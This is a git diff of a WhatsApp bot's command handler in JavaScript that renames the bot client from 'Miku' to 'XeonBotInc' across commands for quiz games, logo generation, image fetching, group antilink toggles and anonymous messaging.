                     caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                     })
                     await sleep(60000)
                     if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                     console.log("Answer: " + result.jawaban)
-                    Miku.sendMessage(m.chat, {image : {url :'https://telegra.ph/file/827fbd7afbcf586dacbce.jpg' }, caption : `ᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ ᴛᴇʟᴀʜ ʜᴀʙɪs!\n\nᴊᴀᴡᴀʙᴀɴɴʏᴀ ᴀᴅᴀʟᴀʜ :  ${caklontong[m.sender.split('@')[0]]}\nᴘᴇɴᴊᴇʟᴀsᴀɴ : ${caklontong_desk[m.sender.split('@')[0]]}\n\nᴊᴀɴɢᴀɴ ɴɢᴀᴍᴜᴋ ᴋᴇ ʙᴏᴛ ᴋᴀᴋ ,ɴɢᴀᴍᴜᴋɴʏᴀ ᴋᴇ ᴄᴀᴋ ʟᴏɴᴛᴏɴɢ sᴏɴᴏ:ᴠsono:v`}, {quoted : m})
+                    XeonBotInc.sendMessage(m.chat, {image : {url :'https://telegra.ph/file/827fbd7afbcf586dacbce.jpg' }, caption : `ᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ ᴛᴇʟᴀʜ ʜᴀʙɪs!\n\nᴊᴀᴡᴀʙᴀɴɴʏᴀ ᴀᴅᴀʟᴀʜ :  ${caklontong[m.sender.split('@')[0]]}\nᴘᴇɴᴊᴇʟᴀsᴀɴ : ${caklontong_desk[m.sender.split('@')[0]]}\n\nᴊᴀɴɢᴀɴ ɴɢᴀᴍᴜᴋ ᴋᴇ ʙᴏᴛ ᴋᴀᴋ ,ɴɢᴀᴍᴜᴋɴʏᴀ ᴋᴇ ᴄᴀᴋ ʟᴏɴᴛᴏɴɢ sᴏɴᴏ:ᴠsono:v`}, {quoted : m})
                     delete caklontong[m.sender.split('@')[0]]
 		    delete caklontong_desk[m.sender.split('@')[0]]
                     }
@@ -1847,7 +1474,7 @@ teks1 = q.split("|")[0]
 teks2 = q.split("|")[1]
 maker.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [
     `${teks1}`,`${teks2}`])
-  .then((data) => Miku.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${BotName}` }, { quoted: m }))
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${BotName}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'pornhub':{
@@ -1860,7 +1487,7 @@ inilogo9 = args.join(" ")
    var logo4 = inilogo4.split('|')[0]
 var logo9 = inilogo9.split('|')[1]
     let anu = await textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
-Miku.sendMessage(from,{image:{url:anu}, caption:"Nihh Bang"},{quoted:m})
+XeonBotInc.sendMessage(from,{image:{url:anu}, caption:"Nihh Bang"},{quoted:m})
 }
 break		
 		
@@ -1878,13 +1505,13 @@ case 'suitpvp': case 'suit': {
 @${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} Untuk Melakukan Suit
 Tolong @${m.mentionedJid[0].split`@`[0]} Ketik *Setuju* Untuk menerima tantangan dan ketik *Males* untuk menolak`
             this.suit[id] = {
-            chat: await Miku.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
+            chat: await XeonBotInc.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
             id: id,
             p: m.sender,
             p2: m.mentionedJid[0],
             status: 'wait',
             waktu: setTimeout(() => {
-            if (this.suit[id]) Miku.sendText(m.chat, `_Waktu Suit Telah Habis_`, m)
+            if (this.suit[id]) XeonBotInc.sendText(m.chat, `_Waktu Suit Telah Habis_`, m)
             delete this.suit[id]
             }, 60000), poin, poin_lose, timeout
             }
@@ -1909,7 +1536,7 @@ View List Of Messages With ${prefix}listmsg`)
                 if (!text) return reply(`Example : ${prefix + command} file name\n\nView Message List With ${prefix}listmsg`)
                 let msgs = global.db.data.database
                 if (!(text.toLowerCase() in msgs)) return reply(`'${text}' Not Listed In The Message List`)
-                Miku.copyNForward(m.chat, msgs[text.toLowerCase()], true)
+                XeonBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
             }
             break
             case 'listmsg': {
@@ -1934,7 +1561,7 @@ View List Of Messages With ${prefix}listmsg`)
             case 'setnamabot': case 'setnamebot': {
 	    if (!isCreator) return replay(mess.botowner)
             if (!text) return m.reply(`Contoh: ${prefix + command} WhatsApp ✅`)
-            let name = await Miku.updateProfileName(text)
+            let name = await XeonBotInc.updateProfileName(text)
             m.reply(`_Nama bot berhasil diubah_`)
             }
             break
@@ -1942,8 +1569,8 @@ View List Of Messages With ${prefix}listmsg`)
                 if (!isCreator) throw mess.owner
                 if (!/image/.test(mime)) return replay( `Kirim/Reply Image Dengan Caption ${prefix + command}` )
                 if (/webp/.test(mime)) return replay( `Kirim/Reply Image Dengan Caption ${prefix + command}` )
-                let media = await Miku.downloadAndSaveMediaMessage(quoted)
-                await Miku.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
+                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+                await XeonBotInc.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                 m.reply(mess.jobdone)
                 }
                 break
@@ -1959,7 +1586,7 @@ break
 	case 'request': case 'req' :{
 if (m.isGroup)	return reply (`Fitur Ini hanya berlaku dichat pribadi/Private Message`)		
 if (!text) return reply(`Tolong Tulis Nama Lengkap Karakter Berserta Asal Usulnya! \n\nContoh Request Karakter Dari Game : ${prefix + command} karakter Sangonomiya Kokomi Dari Game Genshit Impact\n\nContoh Request karakter dari anime : ${prefix + command} Fujiwara Chika Dari Anime Kaguya-Sama Love Is War\n\nContoh Request Artist : ${prefix + command} https://soraneko.fanbox.cc/ \n\nJika Hanya menulis nama lengkap karakter saja(tidak dengan asal usulnya), maka request'anmu tidak akan direspon!!!\n\nHarap Join GC dibawah ini agar nnti jika request'anmu dipost akan diTag\nhttps://chat.whatsapp.com/CLwGABzGLrn13nOmpZKysc\nGajoin? ya gadikabulin :v`)
-				Miku.sendMessage(`120363027296875929@g.us`, {text: `*Hallo Babutachi! , ada yang request karakter nih*\n\n*Pesan : ${text}*\n*Orangnya : ${m.sender}*`,}, {quoted: {key: { fromMe: false,
+				XeonBotInc.sendMessage(`120363027296875929@g.us`, {text: `*Hallo Babutachi! , ada yang request karakter nih*\n\n*Pesan : ${text}*\n*Orangnya : ${m.sender}*`,}, {quoted: {key: { fromMe: false,
 				participant: `${m.sender}`, ...(from ? { remoteJid: "120363027296875929@g.us" } : {})},
 			message: { "extendedTextMessage": {
 				"text": `Ada yg request oniichan!`,
@@ -1989,13 +1616,13 @@ case 'me': case 'profile': {
   if (!isInventory){ addInventori(m.sender) }
   if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }
      var flob = await getBuffer(picak+'User Profile')
-     var bio= await Miku.fetchStatus(m.sender)
+     var bio= await XeonBotInc.fetchStatus(m.sender)
      var bioo = bio.status
      const adn= isAdmins? "True":"False"
      
      try {
         
-        pfp=await Miku.profilePictureUrl(m.sender, 'image')
+        pfp=await XeonBotInc.profilePictureUrl(m.sender, 'image')
     
           } catch (e) {
      
@@ -2016,7 +1643,7 @@ let buttonspros = [
                 buttons: buttonspros,
                 headerType: 4
             }
-        Miku.sendMessage(m.chat,buttonMessage,{quoted:m})
+        XeonBotInc.sendMessage(m.chat,buttonMessage,{quoted:m})
         	}
             break
 	
@@ -2040,13 +1667,13 @@ if (args[0] === "on") {
 if (isBanChat) return replay('This Group is Already Banned from using me!')
 banchat.push(from)
 replay('This Group has been banned from using me!')
-var groupe = await Miku.groupMetadata(from)
+var groupe = await XeonBotInc.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-Miku.sendMessage(from, {text: `\`\`\`「 Notice 」\`\`\`\n\nThis group is banned from using bot. So, here nobody can use me anymore!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+XeonBotInc.sendMessage(from, {text: `\`\`\`「 Notice 」\`\`\`\n\nThis group is banned from using bot. So, here nobody can use me anymore!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!isBanChat) return replay('This Group is Already Banned from using me!')
 let off = banchat.indexOf(from)
@@ -2057,7 +1684,7 @@ replay('This Group has been *unbanned* from using me!')
   { buttonId: `-bangroup on`, buttonText: { displayText: 'Ban' }, type: 1 },
   { buttonId: `-bangroup off`, buttonText: { displayText: 'Unban' }, type: 1 }
   ]
-  await Miku.sendButtonText(m.chat, buttonsntnsfw, `Please choose any Button below.\n\n *On / Off*`, `${global.BotName }`, m)
+  await XeonBotInc.sendButtonText(m.chat, buttonsntnsfw, `Please choose any Button below.\n\n *On / Off*`, `${global.BotName }`, m)
   }
   }
   break
@@ -2073,7 +1700,7 @@ replay('This Group has been *unbanned* from using me!')
 		reply(mess.waiting)
 		
 nye = `https://api.lolhuman.xyz/api/danbooru?apikey=${lolkey}&query=${harusdiisi}`
-Miku.sendMessage(from, {image:{url:nye}, caption:"Ini kak!"}, {quoted:m})
+XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Ini kak!"}, {quoted:m})
 break	
 		case 'update':{
 		if (args.length == 0) return reply(`Contoh: ${prefix + command} azur_lane\nContoh: ${prefix + command} Albedo_(overlord)`)
@@ -2084,45 +1711,45 @@ break
 		reply(mess.waiting)
 		
 nye = `https://api.lolhuman.xyz/api/danbooru?apikey=${lolkey}&query=${harusdiisi}`
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 await sleep(6500)
-Miku.sendImage(m.chat , nye)
+XeonBotInc.sendImage(m.chat , nye)
 }
 break	
 		
@@ -2155,7 +1782,7 @@ case 'ringtone': {
         let { ringtone } = require('./lib/scraper')
 		let anu = await ringtone(text)
 		let result = anu[Math.floor(Math.random() * anu.length)]
-		Miku.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
+		XeonBotInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
 	    }
 	    break
 
@@ -2171,7 +1798,7 @@ xfarrapi.Film(q)
 			    for (let i of data) {
                 krl += (`-----------------------------------------------------------------------------\n\n\n*Movie Name:* ${i.judul}\n *Quality :* ${i.quality}\n *Type : ${i.type}*\n *Uploaded on :* ${i.upload}\n *Source URL :* ${i.link}\n\n\n`)
                 }
-               Miku.sendMessage(from, { image: { url: data[0].thumb}, caption: krl }, { quoted: fdocs })
+               XeonBotInc.sendMessage(from, { image: { url: data[0].thumb}, caption: krl }, { quoted: fdocs })
 });
 break
 
@@ -2193,7 +1820,7 @@ footer : "Miuna",
 buttons : buttonn,
 headerType : 4
 }
-Miku.sendMessage(m.chat, buttonMessage).catch((err) => {
+XeonBotInc.sendMessage(m.chat, buttonMessage).catch((err) => {
                      reply(`Lirik tidak ditemukan atau Webnya engror!`)
                  })
 }
@@ -2219,7 +1846,7 @@ let buttons = [
             buttons: buttons,
             headerType: 4
         }
-        Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
+        XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
     }
     break
 
@@ -2237,7 +1864,7 @@ case 'quotesanime': case 'quoteanime': case 'animequote': case 'animequotes':{
             buttons: buttons,
             headerType: 2
         }
-        Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
+        XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
     }
     break
 
@@ -2247,8 +1874,8 @@ case 'quotesanime': case 'quoteanime': case 'animequote': case 'animequotes':{
 if (isBanChat) return reply(mess.bangc)
 if (!args.join(" ")) return reply('Where is the emoji?')
 emoji.get(args.join(" ")).then(async(emoji) => {
-let mese = await Miku.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Here it is...`}, {quoted:m})
-await Miku.sendMessage(from, {text:"reply -s to this image to make sticker"}, {quoted:mese})
+let mese = await XeonBotInc.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Here it is...`}, {quoted:m})
+await XeonBotInc.sendMessage(from, {text:"reply -s to this image to make sticker"}, {quoted:mese})
 })
 }
 break
@@ -2261,7 +1888,7 @@ break
  for (let i of anu) {
   teks += `\n\nProfile : @${i.id.split('@')[0]}\nChat : ${i.unreadCount}\nLastchat : ${moment(i.conversationTimestamp * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`
  }
- Miku.sendTextWithMentions(m.chat, teks, m)
+ XeonBotInc.sendTextWithMentions(m.chat, teks, m)
  }
  break
 
@@ -2271,7 +1898,7 @@ break
  let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
  let teks = ` 「  List Grup Miuna  」\n\nTotal ada ${anu.length} Grup yang menggunakan Miuna.`
  for (let i of anu) {
-  let metadata = await Miku.groupMetadata(i)
+  let metadata = await XeonBotInc.groupMetadata(i)
   if (metadata.owner === "undefined") {
   loldd = false
   } else {
@@ -2279,7 +1906,7 @@ break
   }
   teks += `\n\nNama Grup : ${metadata.subject ? metadata.subject : "undefined"}\nAdmin : ${loldd ? '@' + loldd.split("@")[0] : "undefined"}\nID : ${metadata.id ? metadata.id : "undefined"}\ntanggal grup dibuat : ${metadata.creation ? moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss') : "undefined"}\nAnggota : ${metadata.participants.length ? metadata.participants.length : "undefined"}`
  }
- Miku.sendTextWithMentions(m.chat, teks, m)
+ XeonBotInc.sendTextWithMentions(m.chat, teks, m)
  }
  break
 
@@ -2346,13 +1973,13 @@ break
  if (AntiLink) return replay('Already activated')
  ntilink.push(from)
  replay('Activated _Antilink_ in this group.')
- var groupe = await Miku.groupMetadata(from)
+ var groupe = await XeonBotInc.groupMetadata(from)
  var members = groupe['participants']
  var mems = []
  members.map(async adm => {
  mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
  })
- Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+ XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
  } else if (args[0] === "off") {
  if (!AntiLink) return replay('Already deactivated!')
  let off = ntilink.indexOf(from)
@@ -2363,7 +1990,7 @@ break
    { buttonId: `-antilinkgc on`, buttonText: { displayText: 'On' }, type: 1 },
    { buttonId: `-antilinkgc off`, buttonText: { displayText: 'Off' }, type: 1 }
    ]
-   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
+   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
    }
    }
    break
@@ -2389,25 +2016,25 @@ footer: `Miuna`,
 buttons: btutonmnfs,
 headerType: 4
 }
-Miku.sendMessage(`${nomor}@s.whatsapp.net`, buntnmenfes, { quoted: fvn })
+XeonBotInc.sendMessage(`${nomor}@s.whatsapp.net`, buntnmenfes, { quoted: fvn })
 m.reply(`Sukses Mengirim Menfess!!`) }
 break
 case 'menfesconfirm': {
-Miku.sendMessage(q, {text: `Sudah Di Confirmasi Nih Menfess Nya Sama Si Dia🤭`})
+XeonBotInc.sendMessage(q, {text: `Sudah Di Confirmasi Nih Menfess Nya Sama Si Dia🤭`})
 m.reply(`Terimakasih Menfess Telah Diterima.\n\nMau kirim menfess juga? klik tombol diatas!`) }
 break
 		
 case 'x' :
 if (!isCreator) return reply (mess.mod)
 if (!args.join(" ")) return reply(`Textnya tot!`) 
-Miku.sendMessage(`120363027488032044@g.us`, { text : args.join(" ") ? args.join(" ") : ''},{ quoted: fdocs })
+XeonBotInc.sendMessage(`120363027488032044@g.us`, { text : args.join(" ") ? args.join(" ") : ''},{ quoted: fdocs })
 break
 case 'k' : {
 if (!isCreator) return reply (mess.mod)
 if (!text) return reply (`textnya?`)
 let nomor = q.split('/')[0] ? q.split('/')[0] : q
 let pesan = q.split('/')[1] ? q.split('/')[1] : q
-Miku.sendMessage(`${nomor}@s.whatsapp.net`, {text : `${pesan}`}, { quoted: fvn })
+XeonBotInc.sendMessage(`${nomor}@s.whatsapp.net`, {text : `${pesan}`}, { quoted: fvn })
 m.reply(`Wess`) 
 }
 break
@@ -2417,7 +2044,7 @@ if (!isCreator) return reply (mess.mod)
 if (!text) return reply (`textnya?`)
 let nomor = q.split('/')[0] ? q.split('/')[0] : q
 let pesan = q.split('/')[1] ? q.split('/')[1] : q
-Miku.sendMessage(`${nomor}@g.us`, {text : `${pesan}`}, { quoted: fvn })
+XeonBotInc.sendMessage(`${nomor}@g.us`, {text : `${pesan}`}, { quoted: fvn })
 m.reply(`Wess`) 
 }
 break
@@ -2433,13 +2060,13 @@ break
  if (AntiLinkYoutubeVid) return replay('Already activated')
  ntilinkytvid.push(from)
  replay('Activated youtube video antilink !')
- var groupe = await Miku.groupMetadata(from)
+ var groupe = await XeonBotInc.groupMetadata(from)
  var members = groupe['participants']
  var mems = []
  members.map(async adm => {
  mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
  })
- Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+ XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
  } else if (args[0] === "off") {
  if (!AntiLinkYoutubeVid) return replay('Already deactivated')
  let off = ntilinkytvid.indexOf(from)
@@ -2450,7 +2077,7 @@ break
    { buttonId: `-antilinkyoutubevideo on`, buttonText: { displayText: 'On' }, type: 1 },
    { buttonId: `-antilinkyoutubevideo off`, buttonText: { displayText: 'Off' }, type: 1 }
    ]
-   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
+   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
    }
    }
    break
@@ -2467,13 +2094,13 @@ break
  if (AntiLinkYoutubeChannel) return replay('Already activated')
  ntilinkytch.push(from)
  replay('Activated youtube channel antilink !')
- var groupe = await Miku.groupMetadata(from)
+ var groupe = await XeonBotInc.groupMetadata(from)
  var members = groupe['participants']
  var mems = []
  members.map(async adm => {
  mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
  })
- Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+ XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
  } else if (args[0] === "off") {
  if (!AntiLinkYoutubeChannel) return replay('Already deactivated')
  let off = ntilinkytch.indexOf(from)
@@ -2484,7 +2111,7 @@ break
    { buttonId: `-antilinkyoutubech on`, buttonText: { displayText: 'On' }, type: 1 },
    { buttonId: `-antilinkyoutubech off`, buttonText: { displayText: 'Off' }, type: 1 }
    ]
-   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
+   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
    }
    }
    break
@@ -2500,13 +2127,13 @@ break
  if (AntiLinkInstagram) return replay('Already activated')
  ntilinkig.push(from)
  replay('Activated instagram antilink !')
- var groupe = await Miku.groupMetadata(from)
+ var groupe = await XeonBotInc.groupMetadata(from)
  var members = groupe['participants']
  var mems = []
  members.map(async adm => {
  mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
  })
- Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+ XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
  } else if (args[0] === "off") {
  if (!AntiLinkInstagram) return replay('Already deactivated')
  let off = ntilinkig.indexOf(from)
@@ -2517,7 +2144,7 @@ break
    { buttonId: `-antilinkinstagram on`, buttonText: { displayText: 'On' }, type: 1 },
    { buttonId: `-antilinkinstagram off`, buttonText: { displayText: 'Off' }, type: 1 }
    ]
-   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
+   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
    }
    }
    break
@@ -2532,13 +2159,13 @@ break
  if (AntiLinkFacebook) return replay('Already activated')
  ntilinkfb.push(from)
  replay('Activated facebook antilink !')
- var groupe = await Miku.groupMetadata(from)
+ var groupe = await XeonBotInc.groupMetadata(from)
  var members = groupe['participants']
  var mems = []
  members.map(async adm => {
  mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
  })
- Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+ XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
  } else if (args[0] === "off") {
  if (!AntiLinkFacebook) return replay('Already deactivated')
  let off = ntilinkfb.indexOf(from)
@@ -2549,7 +2176,7 @@ break
    { buttonId: `-antilinkfacebook on`, buttonText: { displayText: 'On' }, type: 1 },
    { buttonId: `-antilinkfacebook off`, buttonText: { displayText: 'Off' }, type: 1 }
    ]
-   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off `, `${global.BotName}`, m)
+   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off `, `${global.BotName}`, m)
    }
    }
    break
@@ -2565,13 +2192,13 @@ break
  if (AntiLinkTelegram) return replay('Already activated')
  ntilinktg.push(from)
  replay('Activated telegram antilink !')
- var groupe = await Miku.groupMetadata(from)
+ var groupe = await XeonBotInc.groupMetadata(from)
  var members = groupe['participants']
  var mems = []
  members.map(async adm => {
  mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
  })
- Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+ XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
  } else if (args[0] === "off") {
  if (!AntiLinkTelegram) return replay('Already deactivated')
  let off = ntilinkig.indexOf(from)
@@ -2582,7 +2209,7 @@ break
    { buttonId: `-antilinktelegram on`, buttonText: { displayText: 'On' }, type: 1 },
    { buttonId: `-antilinktelegram off`, buttonText: { displayText: 'Off' }, type: 1 }
    ]
-   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off `, `${global.BotName}`, m)
+   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off `, `${global.BotName}`, m)
    }
    }
    break
@@ -2598,13 +2225,13 @@ break
  if (AntiLinkTiktok) return replay('Already activated')
  ntilinktt.push(from)
  replay('Activated tiktok antilink !')
- var groupe = await Miku.groupMetadata(from)
+ var groupe = await XeonBotInc.groupMetadata(from)
  var members = groupe['participants']
  var mems = []
  members.map(async adm => {
  mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
  })
- Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+ XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
  } else if (args[0] === "off") {
  if (!AntiLinkTiktok) return replay('Already deactivated')
  let off = ntilinktt.indexOf(from)
@@ -2615,7 +2242,7 @@ break
    { buttonId: `-antilinktiktok on`, buttonText: { displayText: 'On' }, type: 1 },
    { buttonId: `-antilinktiktok off`, buttonText: { displayText: 'Off' }, type: 1 }
    ]
-   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
+   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
    }
    }
    break
@@ -2630,13 +2257,13 @@ break
  if (AntiLinkTwitter) return replay('Already activated')
  ntilinktwt.push(from)
  replay('Activated twitter antilink in this group !')
- var groupe = await Miku.groupMetadata(from)
+ var groupe = await XeonBotInc.groupMetadata(from)
  var members = groupe['participants']
  var mems = []
  members.map(async adm => {
  mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
  })
- Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+ XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
  } else if (args[0] === "off") {
  if (!AntiLinkTwitter) return replay('Already deactivated')
  let off = ntilinktwt.indexOf(from)
@@ -2647,7 +2274,7 @@ break
    { buttonId: `-antilinktwt on`, buttonText: { displayText: 'On' }, type: 1 },
    { buttonId: `-antilinktwt off`, buttonText: { displayText: 'Off' }, type: 1 }
    ]
-   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
+   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
    }
    }
    break
@@ -2663,13 +2290,13 @@ break
  if (AntiLinkTwitter) return replay('Already activated')
  ntilinkall.push(from)
  replay('Enabled all antilink !')
- var groupe = await Miku.groupMetadata(from)
+ var groupe = await XeonBotInc.groupMetadata(from)
  var members = groupe['participants']
  var mems = []
  members.map(async adm => {
  mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
  })
- Miku.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+ XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
  } else if (args[0] === "off") {
  if (!AntiLinkAll) return replay('Already deactivated')
  let off = ntilinkall.indexOf(from)
@@ -2680,7 +2307,7 @@ break
    { buttonId: `-antilinkall on`, buttonText: { displayText: 'On' }, type: 1 },
    { buttonId: `-antilinkall off`, buttonText: { displayText: 'Off' }, type: 1 }
    ]
-   await Miku.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
+   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
    }
    }
    break
@@ -2696,13 +2323,13 @@ break
  if (antiWame) return replay('Already activated')
  ntwame.push(from)
  replay('Activated antiwame !')
- var groupe = await Miku.groupMetadata(from)
+ var groupe = await XeonBotInc.groupMetadata(from)
  var members = groupe['participants']
  var mems = []
  members.map(async adm => {
  mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
  })
- Miku.sendMessage(from, {text: `\`\`\`*「  Warning  」*\`\`\`\n\nAntilink is enabled!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
